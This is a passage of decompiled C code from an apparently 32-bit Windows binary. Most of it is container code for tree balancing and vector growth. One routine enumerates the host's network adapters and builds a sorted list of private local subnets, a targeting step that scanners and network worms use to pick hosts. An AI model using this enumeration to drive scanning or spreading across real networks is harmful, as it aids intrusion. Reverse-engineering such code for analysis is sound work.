                *(int ***)ppiVar8 = ppiVar7;
              } else {
                *(int ***)(ppiVar8 + 2) = ppiVar7;
              }
            }
            *ppiVar7 = piVar1;
            *(int ***)(piVar1 + 1) = ppiVar7;
            ppiVar7 = (int **)ppiVar9[1][2];
          }
          if (((*ppiVar7)[5] != 1) || (ppiVar7[2][5] != 1)) {
            if (ppiVar7[2][5] == 1) {
              (*ppiVar7)[5] = 1;
              piVar1 = *ppiVar7;
              ppiVar7[5] = (int *)0x0;
              *ppiVar7 = (int *)piVar1[2];
              if ((int **)piVar1[2] != DAT_0070f878) {
                *(int ***)((int **)piVar1[2] + 1) = ppiVar7;
              }
              *(int **)(piVar1 + 1) = ppiVar7[1];
              if (ppiVar7 == *(int ***)(*(int *)((int)this + 4) + 4)) {
                *(int **)(*(int *)((int)this + 4) + 4) = piVar1;
              } else {
                ppiVar8 = (int **)ppiVar7[1];
                if (ppiVar7 == (int **)ppiVar8[2]) {
                  ppiVar8[2] = piVar1;
                } else {
                  *ppiVar8 = piVar1;
                }
              }
              *(int ***)(piVar1 + 2) = ppiVar7;
              ppiVar7[1] = piVar1;
              ppiVar7 = (int **)ppiVar9[1][2];
            }
            ppiVar7[5] = (int *)ppiVar9[1][5];
            ppiVar9[1][5] = 1;
            ppiVar7[2][5] = 1;
            ppiVar7 = (int **)ppiVar9[1];
            ppiVar8 = (int **)ppiVar7[2];
            ppiVar7[2] = *ppiVar8;
            if ((int **)*ppiVar8 != DAT_0070f878) {
              *(int ***)(*ppiVar8 + 1) = ppiVar7;
            }
            ppiVar8[1] = ppiVar7[1];
            if (ppiVar7 == (int **)*(int *)(*(int *)((int)this + 4) + 4)) {
              *(int ***)(*(int *)((int)this + 4) + 4) = ppiVar8;
              *(int ***)ppiVar8 = ppiVar7;
            } else {
              ppiVar5 = (int **)ppiVar7[1];
              if (ppiVar7 == (int **)*ppiVar5) {
                *(int ***)ppiVar5 = ppiVar8;
                *(int ***)ppiVar8 = ppiVar7;
              } else {
                *(int ***)(ppiVar5 + 2) = ppiVar8;
                *(int ***)ppiVar8 = ppiVar7;
              }
            }
LAB_00408997:
            *(int ***)(ppiVar7 + 1) = ppiVar8;
            break;
          }
        } else {
          if (ppiVar7[5] == (int *)0x0) {
            ppiVar7[5] = (int *)0x1;
            ppiVar9[1][5] = 0;
            piVar1 = ppiVar9[1];
            iVar2 = *piVar1;
            *piVar1 = *(int *)(iVar2 + 8);
            if (*(int ***)(iVar2 + 8) != DAT_0070f878) {
              (*(int ***)(iVar2 + 8))[1] = piVar1;
            }
            *(int *)(iVar2 + 4) = piVar1[1];
            if (piVar1 == *(int **)(*(int *)((int)this + 4) + 4)) {
              *(int *)(*(int *)((int)this + 4) + 4) = iVar2;
            } else {
              piVar3 = (int *)piVar1[1];
              if (piVar1 == (int *)piVar3[2]) {
                piVar3[2] = iVar2;
              } else {
                *piVar3 = iVar2;
              }
            }
            *(int **)(iVar2 + 8) = piVar1;
            piVar1[1] = iVar2;
            ppiVar7 = (int **)*ppiVar9[1];
          }
          if ((ppiVar7[2][5] != 1) || ((*ppiVar7)[5] != 1)) {
            if ((*ppiVar7)[5] == 1) {
              ppiVar7[2][5] = 1;
              ppiVar8 = (int **)ppiVar7[2];
              ppiVar7[5] = (int *)0x0;
              ppiVar7[2] = *ppiVar8;
              if ((int **)*ppiVar8 != DAT_0070f878) {
                *(int ***)(*ppiVar8 + 1) = ppiVar7;
              }
              ppiVar8[1] = ppiVar7[1];
              if (ppiVar7 == *(int ***)(*(int *)((int)this + 4) + 4)) {
                *(int ***)(*(int *)((int)this + 4) + 4) = ppiVar8;
              }
              else {
                ppiVar5 = (int **)ppiVar7[1];
                if (ppiVar7 == (int **)*ppiVar5) {
                  *(int ***)ppiVar5 = ppiVar8;
                }
                else {
                  *(int ***)(ppiVar5 + 2) = ppiVar8;
                }
              }
              *(int ***)ppiVar8 = ppiVar7;
              *(int ***)(ppiVar7 + 1) = ppiVar8;
              ppiVar7 = (int **)*ppiVar9[1];
            }
            ppiVar7[5] = (int *)ppiVar9[1][5];
            ppiVar9[1][5] = 1;
            (*ppiVar7)[5] = 1;
            ppiVar7 = (int **)ppiVar9[1];
            ppiVar8 = (int **)*ppiVar7;
            *ppiVar7 = ppiVar8[2];
            if ((int **)ppiVar8[2] != DAT_0070f878) {
              *(int ***)(ppiVar8[2] + 1) = ppiVar7;
            }
            ppiVar8[1] = ppiVar7[1];
            if (ppiVar7 == *(int ***)(*(int *)((int)this + 4) + 4)) {
              *(int ***)(*(int *)((int)this + 4) + 4) = ppiVar8;
            }
            else {
              ppiVar5 = (int **)ppiVar7[1];
              if (ppiVar7 == (int **)ppiVar5[2]) {
                *(int ***)(ppiVar5 + 2) = ppiVar8;
              }
              else {
                *(int ***)ppiVar5 = ppiVar8;
              }
            }
            *(int ***)(ppiVar8 + 2) = ppiVar7;
            goto LAB_00408997;
          }
        }
        ppiVar7[5] = (int *)0x0;
        ppiVar9 = (int **)ppiVar9[1];
      } while (ppiVar9 != *(int ***)(*(int *)((int)this + 4) + 4));
    }
    ppiVar9[5] = (int *)0x1;
  }
  __Lockit(local_4);
  FUN_004097fe(local_c);
  *(int *)((int)this + 0xc) = *(int *)((int)this + 0xc) + -1;
  *(int ***)param_1 = param_2;
  return;
}

void FUN_004089d0(int *param_1) {
  int *piVar1;
  
  if (param_1 != DAT_0070f878) {
    do {
      FUN_004089d0((int *)param_1[2]);
      piVar1 = (int *)*param_1;
      FUN_004097fe(param_1);
      param_1 = piVar1;
    } while (piVar1 != DAT_0070f878);
  }
  return;
}

void __fastcall FUN_00408a10(int *param_1) {
  undefined4 *puVar1;
  undefined4 *puVar2;
  int iVar3;
  
  puVar1 = *(undefined4 **)(*param_1 + 8);
  if (puVar1 == DAT_0070f878) {
    iVar3 = *(int *)(*param_1 + 4);
    if (*param_1 == *(int *)(iVar3 + 8)) {
      do {
        *param_1 = iVar3;
        iVar3 = *(int *)(iVar3 + 4);
      } while (*param_1 == *(int *)(iVar3 + 8));
    }
    if (*(int *)(*param_1 + 8) != iVar3) {
      *param_1 = iVar3;
    }
    return;
  }
  puVar2 = (undefined4 *)*puVar1;
  while (puVar2 != DAT_0070f878) {
    puVar1 = puVar2;
    puVar2 = (undefined4 *)*puVar2;
  }
  *(undefined4 **)param_1 = puVar1;
  return;
}

void __thiscall FUN_00408a60(void *this,int **param_1,int *param_2,int **param_3,int *param_4) {
  int **ppiVar1;
  int *piVar2;
  int **ppiVar3;
  int **ppiVar4;
  int *piVar5;
  int **ppiVar6;
  
  ppiVar3 = (int **)operator_new(0x18);
  *(int ***)(ppiVar3 + 1) = param_3;
  ppiVar3[5] = (int *)0x0;
  *ppiVar3 = DAT_0070f878;
  ppiVar3[2] = DAT_0070f878;
  FUN_00408e30(ppiVar3 + 3,param_4);
  *(int *)((int)this + 0xc) = *(int *)((int)this + 0xc) + 1;
  if (((param_3 == *(int ***)((int)this + 4)) || (param_2 != DAT_0070f878)) ||
     (*param_4 < (int)param_3[3])) {
    *(int ***)param_3 = ppiVar3;
    ppiVar4 = *(int ***)((int)this + 4);
    if (param_3 == ppiVar4) {
      *(int ***)(ppiVar4 + 1) = ppiVar3;
      *(int ***)(*(int *)((int)this + 4) + 8) = ppiVar3;
    }
    else {
      if (param_3 == (int **)*ppiVar4) {
        *(int ***)ppiVar4 = ppiVar3;
      }
    }
  }
  else {
    *(int ***)(param_3 + 2) = ppiVar3;
    if (param_3 == *(int ***)(*(int *)((int)this + 4) + 8)) {
      *(int ***)(*(int *)((int)this + 4) + 8) = ppiVar3;
    }
  }
  ppiVar4 = ppiVar3;
  if (ppiVar3 != *(int ***)(*(int *)((int)this + 4) + 4)) {
    do {
      ppiVar6 = (int **)ppiVar4[1];
      if (ppiVar6[5] != (int *)0x0) break;
      ppiVar1 = (int **)*ppiVar6[1];
      if (ppiVar6 == ppiVar1) {
        piVar5 = (int *)ppiVar6[1][2];
        if (piVar5[5] == 0) {
          ppiVar6[5] = (int *)0x1;
          piVar5[5] = 1;
          *(undefined4 *)(ppiVar4[1][1] + 0x14) = 0;
          ppiVar4 = (int **)ppiVar4[1][1];
        }
        else {
          if (ppiVar4 == (int **)ppiVar6[2]) {
            ppiVar4 = (int **)ppiVar6[2];
            ppiVar6[2] = *ppiVar4;
            if (*ppiVar4 != DAT_0070f878) {
              *(int ***)(*ppiVar4 + 1) = ppiVar6;
            }
            ppiVar4[1] = ppiVar6[1];
            if (ppiVar6 == *(int ***)(*(int *)((int)this + 4) + 4)) {
              *(int ***)(*(int *)((int)this + 4) + 4) = ppiVar4;
            }
            else {
              ppiVar1 = (int **)ppiVar6[1];
              if (ppiVar6 == (int **)*ppiVar1) {
                *(int ***)ppiVar1 = ppiVar4;
              }
              else {
                *(int ***)(ppiVar1 + 2) = ppiVar4;
              }
            }
            *(int ***)ppiVar4 = ppiVar6;
            *(int ***)(ppiVar6 + 1) = ppiVar4;
            ppiVar4 = ppiVar6;
          }
          ppiVar4[1][5] = 1;
          *(undefined4 *)(ppiVar4[1][1] + 0x14) = 0;
          piVar5 = (int *)ppiVar4[1][1];
          ppiVar6 = (int **)*piVar5;
          *(int **)piVar5 = ppiVar6[2];
          if (ppiVar6[2] != DAT_0070f878) {
            *(int **)(ppiVar6[2] + 1) = piVar5;
          }
          *(int *)(ppiVar6 + 1) = piVar5[1];
          if (piVar5 == *(int **)(*(int *)((int)this + 4) + 4)) {
            *(int ***)(*(int *)((int)this + 4) + 4) = ppiVar6;
            ppiVar6[2] = piVar5;
          }
          else {
            piVar2 = (int *)piVar5[1];
            if (piVar5 == (int *)piVar2[2]) {
              *(int ***)(piVar2 + 2) = ppiVar6;
              ppiVar6[2] = piVar5;
            }
            else {
              *(int ***)piVar2 = ppiVar6;
              ppiVar6[2] = piVar5;
            }
          }
LAB_00408c9c:
          *(int ***)(piVar5 + 1) = ppiVar6;
        }
      }
      else {
        if (ppiVar1[5] != (int *)0x0) {
          if (ppiVar4 == (int **)*ppiVar6) {
            piVar5 = *ppiVar6;
            *ppiVar6 = (int *)piVar5[2];
            if ((int *)piVar5[2] != DAT_0070f878) {
              *(int ***)((int *)piVar5[2] + 1) = ppiVar6;
            }
            *(int **)(piVar5 + 1) = ppiVar6[1];
            if (ppiVar6 == *(int ***)(*(int *)((int)this + 4) + 4)) {
              *(int **)(*(int *)((int)this + 4) + 4) = piVar5;
            }
            else {
              ppiVar4 = (int **)ppiVar6[1];
              if (ppiVar6 == (int **)ppiVar4[2]) {
                ppiVar4[2] = piVar5;
              }
              else {
                *ppiVar4 = piVar5;
              }
            }
            *(int ***)(piVar5 + 2) = ppiVar6;
            ppiVar6[1] = piVar5;
            ppiVar4 = ppiVar6;
          }
          ppiVar4[1][5] = 1;
          *(undefined4 *)(ppiVar4[1][1] + 0x14) = 0;
          piVar5 = (int *)ppiVar4[1][1];
          ppiVar6 = (int **)piVar5[2];
          *(int **)(piVar5 + 2) = *ppiVar6;
          if (*ppiVar6 != DAT_0070f878) {
            *(int **)(*ppiVar6 + 1) = piVar5;
          }
          ppiVar6[1] = (int *)piVar5[1];
          if (piVar5 == *(int **)(*(int *)((int)this + 4) + 4)) {
            *(int ***)(*(int *)((int)this + 4) + 4) = ppiVar6;
          }
          else {
            ppiVar1 = (int **)piVar5[1];
            if (piVar5 == *ppiVar1) {
              *(int ***)ppiVar1 = ppiVar6;
            }
            else {
              *(int ***)(ppiVar1 + 2) = ppiVar6;
            }
          }
          *ppiVar6 = piVar5;
          goto LAB_00408c9c;
        }
        ppiVar6[5] = (int *)0x1;
        ppiVar1[5] = (int *)0x1;
        *(undefined4 *)(ppiVar4[1][1] + 0x14) = 0;
        ppiVar4 = (int **)ppiVar4[1][1];
      }
    } while (ppiVar4 != *(int ***)(*(int *)((int)this + 4) + 4));
  }
  *(undefined4 *)(*(int *)(*(int *)((int)this + 4) + 4) + 0x14) = 1;
  *(int ***)param_1 = ppiVar3;
  return;
}

void __thiscall FUN_00408cd0(void *this,int *param_1) {
  int **ppiVar1;
  int **ppiVar2;
  
  ppiVar1 = (int **)param_1[2];
  *(int **)(param_1 + 2) = *ppiVar1;
  if (*ppiVar1 != DAT_0070f878) {
    *(int **)(*ppiVar1 + 1) = param_1;
  }
  ppiVar1[1] = (int *)param_1[1];
  if (param_1 == *(int **)(*(int *)((int)this + 4) + 4)) {
    *(int ***)(*(int *)((int)this + 4) + 4) = ppiVar1;
    *ppiVar1 = param_1;
    *(int ***)(param_1 + 1) = ppiVar1;
    return;
  }
  ppiVar2 = (int **)param_1[1];
  if (param_1 == *ppiVar2) {
    *(int ***)ppiVar2 = ppiVar1;
    *ppiVar1 = param_1;
    *(int ***)(param_1 + 1) = ppiVar1;
    return;
  }
  *(int ***)(ppiVar2 + 2) = ppiVar1;
  *ppiVar1 = param_1;
  *(int ***)(param_1 + 1) = ppiVar1;
  return;
}

void __cdecl FUN_00408d30(undefined4 *param_1) {
  param_1 = (undefined4 *)*param_1;
  while (param_1 != DAT_0070f878) {
    param_1 = (undefined4 *)*param_1;
  }
  return;
}

void __thiscall FUN_00408d50(void *this,int *param_1) {
  int iVar1;
  int *piVar2;
  
  iVar1 = *param_1;
  *param_1 = *(int *)(iVar1 + 8);
  if (*(int *)(iVar1 + 8) != DAT_0070f878) {
    *(int **)(*(int *)(iVar1 + 8) + 4) = param_1;
  }
  *(int *)(iVar1 + 4) = param_1[1];
  if (param_1 == *(int **)(*(int *)((int)this + 4) + 4)) {
    *(int *)(*(int *)((int)this + 4) + 4) = iVar1;
    *(int **)(iVar1 + 8) = param_1;
    param_1[1] = iVar1;
    return;
  }
  piVar2 = (int *)param_1[1];
  if (param_1 == (int *)piVar2[2]) {
    piVar2[2] = iVar1;
    *(int **)(iVar1 + 8) = param_1;
    param_1[1] = iVar1;
    return;
  }
  *piVar2 = iVar1;
  *(int **)(iVar1 + 8) = param_1;
  param_1[1] = iVar1;
  return;
}

void FUN_00408db0(undefined4 param_1,undefined4 param_2) {
  void *pvVar1;
  
  pvVar1 = operator_new(0x18);
  *(undefined4 *)((int)pvVar1 + 4) = param_1;
  *(undefined4 *)((int)pvVar1 + 0x14) = param_2;
  return;
}

void __fastcall FUN_00408dd0(int **param_1) {
  int *piVar1;
  int *piVar2;
  int **ppiVar3;
  
  ppiVar3 = (int **)*param_1;
  if ((ppiVar3[5] == (int *)0x0) && ((int **)ppiVar3[1][1] == ppiVar3)) {
    *param_1 = ppiVar3[2];
    return;
  }
  piVar1 = *ppiVar3;
  if (piVar1 == DAT_0070f878) {
    ppiVar3 = (int **)ppiVar3[1];
    if (*param_1 == *ppiVar3) {
      do {
        *(int ***)param_1 = ppiVar3;
        ppiVar3 = (int **)ppiVar3[1];
      } while (*param_1 == *ppiVar3);
    }
    *(int ***)param_1 = ppiVar3;
    return;
  }
  piVar2 = (int *)piVar1[2];
  while (piVar2 != DAT_0070f878) {
    piVar1 = piVar2;
    piVar2 = (int *)piVar2[2];
  }
  *param_1 = piVar1;
  return;
}

void __cdecl FUN_00408e30(undefined4 *param_1,undefined4 *param_2) {
  if (param_1 != (undefined4 *)0x0) {
    *param_1 = *param_2;
    param_1[1] = param_2[1];
  }
  return;
}

// WARNING: Removing unreachable block (ram,0x00408fdb)
// WARNING: Removing unreachable block (ram,0x00408ff6)
// WARNING: Removing unreachable block (ram,0x00409005)
// WARNING: Removing unreachable block (ram,0x0040900c)

void __cdecl FUN_00408e50(undefined4 *param_1,undefined4 param_2) {
  undefined4 uVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  uint uVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  undefined4 *puVar8;
  undefined4 *puVar9;
  undefined4 *puVar10;
  int iStack4;
  
  puVar7 = (undefined4 *)Ordinal_8(param_2);
  puVar8 = (undefined4 *)Ordinal_8(param_2);
  puVar10 = puVar8;
  if (puVar7 <= puVar8) {
    do {
      if ((((uint)puVar7 & 0xff) != 0) && (((uint)puVar7 & 0xff) != 0xff)) {
        param_1 = puVar7;
        uVar1 = Ordinal_14(puVar7);
        puVar9 = *(undefined4 **)(iStack4 + 8);
        if (*(int *)(iStack4 + 0xc) - (int)puVar9 >> 2 == 0) {
          iVar2 = *(int *)(iStack4 + 4);
          if ((iVar2 == 0) || (uVar5 = (int)((int)puVar9 - iVar2) >> 2, uVar5 < 2)) {
            uVar5 = 1;
          }
          if (iVar2 == 0) {
            iVar2 = 0;
          }
          else {
            iVar2 = (int)((int)puVar9 - iVar2) >> 2;
          }
          iVar2 = iVar2 + uVar5;
          iVar3 = iVar2;
          if (iVar2 < 0) {
            iVar3 = 0;
          }
          puVar4 = (undefined4 *)operator_new(iVar3 << 2);
          puVar7 = *(undefined4 **)(iStack4 + 4);
          puVar6 = puVar4;
          puVar8 = puVar10;
          while (puVar7 != puVar9) {
            FUN_004090b0(puVar6,puVar7);
            puVar7 = puVar7 + 1;
            puVar6 = puVar6 + 1;
          }
          FUN_00409080(puVar6,1,(undefined4 *)register0x00000010);
          FUN_00409050(puVar9,*(undefined4 **)(iStack4 + 8),puVar6 + 1);
          FUN_00409040();
          FUN_004097fe(*(void **)(iStack4 + 4));
          *(undefined4 **)(iStack4 + 0xc) = puVar4 + iVar2;
          if (*(int *)(iStack4 + 4) == 0) {
            iVar2 = 0;
          }
          else {
            iVar2 = *(int *)(iStack4 + 8) - *(int *)(iStack4 + 4) >> 2;
          }
          *(undefined4 **)(iStack4 + 4) = puVar4;
          *(undefined4 **)(iStack4 + 8) = puVar4 + iVar2 + 1;
          puVar7 = param_1;
          puVar10 = puVar8;
        }
        else {
          FUN_00409050(puVar9,puVar9,puVar9 + 1);
          FUN_00409080(*(undefined4 **)(iStack4 + 8),
                       1 - ((int)((int)*(undefined4 **)(iStack4 + 8) - (int)puVar9) >> 2),
                       (undefined4 *)register0x00000010);
          puVar6 = *(undefined4 **)(iStack4 + 8);
          while (puVar9 != puVar6) {
            *puVar9 = uVar1;
            puVar9 = puVar9 + 1;
          }
          *(int *)(iStack4 + 8) = *(int *)(iStack4 + 8) + 4;
        }
      }
      puVar7 = (undefined4 *)((int)puVar7 + 1);
    } while (puVar7 <= puVar8);
  }
  return;
}

void FUN_00409040(void) {
  return;
}

undefined4 * FUN_00409050(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3) {
  if (param_1 == param_2) {
    return param_3;
  }
  do {
    if (param_3 != (undefined4 *)0x0) {
      *param_3 = *param_1;
    }
    param_1 = param_1 + 1;
    param_3 = param_3 + 1;
  } while (param_1 != param_2);
  return param_3;
}

void FUN_00409080(undefined4 *param_1,int param_2,undefined4 *param_3) {
  if (param_2 != 0) {
    do {
      if (param_1 != (undefined4 *)0x0) {
        *param_1 = *param_3;
      }
      param_1 = param_1 + 1;
      param_2 = param_2 + -1;
    } while (param_2 != 0);
  }
  return;
}

void __cdecl FUN_004090b0(undefined4 *param_1,undefined4 *param_2) {
  if (param_1 != (undefined4 *)0x0) {
    *param_1 = *param_2;
  }
  return;
}

undefined4 __cdecl FUN_004090d0(undefined4 param_1) {
  uint uVar1;
  uint uVar2;
  undefined4 unaff_retaddr;
  
  uVar1 = Ordinal_8(param_1);
  uVar2 = Ordinal_8(param_1);
  if (uVar2 <= uVar1) {
    uVar1 = Ordinal_8(param_1);
    uVar2 = Ordinal_8(unaff_retaddr);
    if (uVar1 <= uVar2) {
      return 1;
    }
  }
  return 0;
}

undefined4 __cdecl FUN_00409110(undefined4 param_1) {
  uint uVar1;
  
  uVar1 = Ordinal_8(param_1);
  if ((0x9ffffff < uVar1) && (uVar1 < 0xb000000)) {
    return 1;
  }
  if ((0xac0fffff < uVar1) && (uVar1 < 0xac200000)) {
    return 1;
  }
  if ((0xc0a7ffff < uVar1) && (uVar1 < 0xc0a90000)) {
    return 1;
  }
  return 0;
}

undefined4 FUN_00409160(void) {
  uint *puVar1;
  uint uVar2;
  uint *puVar3;
  undefined4 *puVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  undefined4 uVar8;
  HLOCAL hMem;
  int *piVar9;
  int *piVar10;
  int *hMem_00;
  uint *puVar11;
  int **ppiVar12;
  int *piVar13;
  int ***uBytes;
  int *piStack32;
  int **ppiStack28;
  HLOCAL local_14 [2];
  undefined4 *puStack12;
  void *pvStack8;
  
  ppiStack28 = (int **)local_14;
  piStack32 = (int *)0x0;
  local_14[0] = (HLOCAL)0x0;
  iVar5 = GetAdaptersInfo();
  if (((iVar5 == 0x6f) && (ppiStack28 != (int **)0x0)) &&
     (hMem_00 = (int *)LocalAlloc(0,(SIZE_T)ppiStack28), hMem_00 != (int *)0x0)) {
    uBytes = &ppiStack28;
    piVar10 = hMem_00;
    iVar5 = GetAdaptersInfo(hMem_00);
    if (iVar5 == 0) {
      do {
        ppiVar12 = (int **)(hMem_00 + 0x6b);
        while (ppiStack28 = ppiVar12, ppiVar12 != (int **)0x0) {
          ppiStack28 = (int **)Ordinal_11(ppiVar12 + 1);
          uVar6 = Ordinal_11(ppiVar12 + 5);
          if (((piVar10 != (int *)0xffffffff) && (piVar10 != (int *)0x0)) &&
             ((uVar6 != 0xffffffff && (uVar6 != 0)))) {
            FUN_00408e50(puStack12,uVar6 & (uint)piVar10);
            FUN_00409470(pvStack8,*(undefined4 **)((int)pvStack8 + 8),1,
                         (undefined4 *)&stack0xffffffe8);
            ppiVar12 = (int **)(hMem_00 + 0x75);
            while (ppiVar12 != (int **)0x0) {
              iVar5 = Ordinal_11(ppiVar12 + 1);
              if (((iVar5 != -1) && (iVar5 != 0)) && (iVar7 = FUN_004090d0(iVar5), iVar7 == 0)) {
                uVar8 = Ordinal_8(iVar5);
                uVar8 = Ordinal_14(CONCAT31((int3)((uint)uVar8 >> 8),0xff));
                uVar6 = Ordinal_8(iVar5,uVar8);
                uVar8 = Ordinal_14(uVar6 & 0xffffff00);
                FUN_00408e50(puStack12,uVar8);
              }
              ppiVar12 = (int **)*ppiVar12;
              hMem_00 = piStack32;
            }
            iVar5 = GetPerAdapterInfo(hMem_00[0x67],0,&stack0xffffffdc);
            ppiVar12 = ppiStack28;
            if (iVar5 == 0x6f) {
              hMem = LocalAlloc(0,(SIZE_T)uBytes);
              local_14[0] = hMem;
              if ((hMem != (HLOCAL)0x0) &&
                 (iVar5 = GetPerAdapterInfo(piStack32[0x67],hMem,&stack0xffffffdc), iVar5 != 0)) {
                puVar4 = (undefined4 *)((int)hMem + 0xc);
                while (puVar4 != (undefined4 *)0x0) {
                  iVar5 = Ordinal_11(puVar4 + 1);
                  if ((((iVar5 != -1) && (iVar5 != 0)) && (iVar7 = FUN_00409110(iVar5), iVar7 != 0))
                     && (iVar7 = FUN_004090d0(iVar5), iVar7 == 0)) {
                    uVar8 = Ordinal_8(iVar5);
                    uVar8 = Ordinal_14(CONCAT31((int3)((uint)uVar8 >> 8),0xff));
                    uVar6 = Ordinal_8(iVar5,uVar8);
                    uVar8 = Ordinal_14(uVar6 & 0xffffff00);
                    FUN_00408e50(puStack12,uVar8);
                  }
                  puVar4 = (undefined4 *)*puVar4;
                  hMem = local_14[0];
                }
              }
              LocalFree(hMem);
              hMem_00 = piStack32;
              ppiVar12 = ppiStack28;
            }
          }
          ppiVar12 = (int **)*ppiVar12;
        }
        hMem_00 = (int *)*hMem_00;
        piStack32 = hMem_00;
      } while (hMem_00 != (int *)0x0);
      puVar1 = (uint *)puStack12[2];
      puVar3 = (uint *)puStack12[1];
      if ((int)((uint)((int)puVar1 - (int)puVar3) & 0xfffffffc) < 0x41) {
        FUN_00409750(puVar3,puVar1);
      }
      else {
        FUN_00409680(puVar3,puVar1);
        puVar11 = puVar3 + 0x10;
        FUN_00409750(puVar3,puVar11);
        while (puVar11 != puVar1) {
          uVar6 = *puVar11;
          uVar2 = puVar11[-1];
          puVar3 = puVar11;
          while (uVar6 < uVar2) {
            *puVar3 = uVar2;
            uVar2 = puVar3[-2];
            puVar3 = puVar3 + -1;
          }
          puVar11 = puVar11 + 1;
          *puVar3 = uVar6;
        }
      }
      hMem_00 = (int *)puStack12[2];
      piVar9 = (int *)puStack12[1];
      piVar10 = hMem_00;
      if ((int *)puStack12[1] != hMem_00) {
        do {
          piVar13 = piVar9;
          piVar9 = piVar13 + 1;
          if (piVar9 == hMem_00) goto LAB_00409431;
        } while (*piVar13 != *piVar9);
        piVar10 = piVar13;
        if (piVar13 != hMem_00) {
          piVar9 = piVar13 + 1;
          piVar10 = piVar9;
          while (piVar9 != hMem_00) {
            if (*piVar13 != *piVar9) {
              *piVar10 = *piVar9;
              piVar10 = piVar10 + 1;
              piVar13 = piVar9;
            }
            piVar9 = piVar9 + 1;
          }
        }
      }
LAB_00409431:
      piVar9 = (int *)puStack12[2];
      while (hMem_00 != piVar9) {
        iVar5 = *hMem_00;
        hMem_00 = hMem_00 + 1;
        *piVar10 = iVar5;
        piVar10 = piVar10 + 1;
      }
      uVar8 = puStack12[2];
      *(int **)(puStack12 + 2) = piVar10;
      puStack12 = (undefined4 *)uVar8;
      LocalFree(piStack32);
      return 1;
    }
    LocalFree(hMem_00);
  }
  return 0;
}

void __thiscall FUN_00409470(void *this,undefined4 *param_1,uint param_2,undefined4 *param_3) {
  undefined4 *puVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  uint uVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  
  puVar4 = *(undefined4 **)((int)this + 8);
  if (param_2 <= (uint)(*(int *)((int)this + 0xc) - (int)puVar4 >> 2)) {
    if ((uint)((int)((int)puVar4 - (int)param_1) >> 2) < param_2) {
      puVar7 = param_1 + param_2;
      if (param_1 != puVar4) {
        puVar6 = puVar7 + param_2 * 0x3fffffff;
        do {
          if (puVar7 != (undefined4 *)0x0) {
            *puVar7 = *puVar6;
          }
          puVar6 = puVar6 + 1;
          puVar7 = puVar7 + 1;
        } while (puVar6 != puVar4);
      }
      puVar4 = *(undefined4 **)((int)this + 8);
      iVar2 = param_2 - ((int)((int)puVar4 - (int)param_1) >> 2);
      while (iVar2 != 0) {
        if (puVar4 != (undefined4 *)0x0) {
          *puVar4 = *param_3;
        }
        puVar4 = puVar4 + 1;
        iVar2 = iVar2 + -1;
      }
      puVar4 = *(undefined4 **)((int)this + 8);
      if (param_1 != puVar4) {
        do {
          *param_1 = *param_3;
          param_1 = param_1 + 1;
        } while (param_1 != puVar4);
      }
      *(int *)((int)this + 8) = *(int *)((int)this + 8) + param_2 * 4;
      return;
    }
    if (param_2 != 0) {
      puVar6 = puVar4 + param_2 * 0x3fffffff;
      puVar7 = puVar4;
      while (puVar6 != puVar4) {
        if (puVar7 != (undefined4 *)0x0) {
          *puVar7 = *puVar6;
        }
        puVar6 = puVar6 + 1;
        puVar7 = puVar7 + 1;
      }
      puVar4 = *(undefined4 **)((int)this + 8);
      puVar7 = puVar4 + param_2 * 0x3fffffff;
      while (param_1 != puVar7) {
        puVar6 = puVar7 + -1;
        puVar7 = puVar7 + -1;
        puVar4 = puVar4 + -1;
        *puVar4 = *puVar6;
      }
      puVar4 = param_1 + param_2;
      if (param_1 != puVar4) {
        do {
          *param_1 = *param_3;
          param_1 = param_1 + 1;
        } while (param_1 != puVar4);
      }
      *(int *)((int)this + 8) = *(int *)((int)this + 8) + param_2 * 4;
    }
    return;
  }
  iVar2 = *(int *)((int)this + 4);
  if ((iVar2 == 0) || (uVar5 = (int)((int)puVar4 - iVar2) >> 2, uVar5 <= param_2)) {
    uVar5 = param_2;
  }
  if (iVar2 == 0) {
    iVar2 = 0;
  }
  else {
    iVar2 = (int)((int)puVar4 - iVar2) >> 2;
  }
  iVar2 = iVar2 + uVar5;
  iVar3 = iVar2;
  if (iVar2 < 0) {
    iVar3 = 0;
  }
  puVar6 = (undefined4 *)operator_new(iVar3 * 4);
  puVar4 = *(undefined4 **)((int)this + 4);
  puVar7 = puVar6;
  while (puVar4 != param_1) {
    if (puVar7 != (undefined4 *)0x0) {
      *puVar7 = *puVar4;
    }
    puVar4 = puVar4 + 1;
    puVar7 = puVar7 + 1;
  }
  puVar4 = puVar7;
  uVar5 = param_2;
  if (param_2 != 0) {
    do {
      if (puVar4 != (undefined4 *)0x0) {
        *puVar4 = *param_3;
      }
      uVar5 = uVar5 - 1;
      puVar4 = puVar4 + 1;
    } while (uVar5 != 0);
  }
  puVar1 = *(undefined4 **)((int)this + 8);
  puVar4 = puVar7 + param_2;
  if (param_1 != puVar1) {
    param_1 = (undefined4 *)((int)puVar4 + (param_2 * -4 - (int)puVar7) + (int)param_1);
    do {
      if (puVar4 != (undefined4 *)0x0) {
        *puVar4 = *param_1;
      }
      param_1 = param_1 + 1;
      puVar4 = puVar4 + 1;
    } while (param_1 != puVar1);
  }
  FUN_004097fe(*(void **)((int)this + 4));
  *(undefined4 **)((int)this + 0xc) = puVar6 + iVar2;
  iVar2 = *(int *)((int)this + 4);
  if (iVar2 == 0) {
    *(undefined4 **)((int)this + 4) = puVar6;
    *(undefined4 **)((int)this + 8) = puVar6 + param_2;
    return;
  }
  *(undefined4 **)((int)this + 4) = puVar6;
  *(undefined4 **)((int)this + 8) = puVar6 + (*(int *)((int)this + 8) - iVar2 >> 2) + param_2;
  return;
}

void __cdecl FUN_00409680(uint *param_1,uint *param_2) {
  uint uVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  uint uVar5;
  uint *param_2_00;
  
  puVar4 = (uint *)((int)param_2 - (int)param_1);
  do {
    if ((int)((uint)puVar4 & 0xfffffffc) < 0x41) {
      return;
    }
    uVar5 = *param_1;
    uVar1 = param_2[-1];
    uVar2 = param_1[((int)puVar4 >> 2) - ((int)puVar4 >> 0x1f) >> 1];
    puVar4 = param_2;
    param_2_00 = param_1;
    if (uVar5 < uVar2) {
      if (uVar2 < uVar1) {
LAB_004096c8:
        uVar5 = uVar2;
      }
      else {
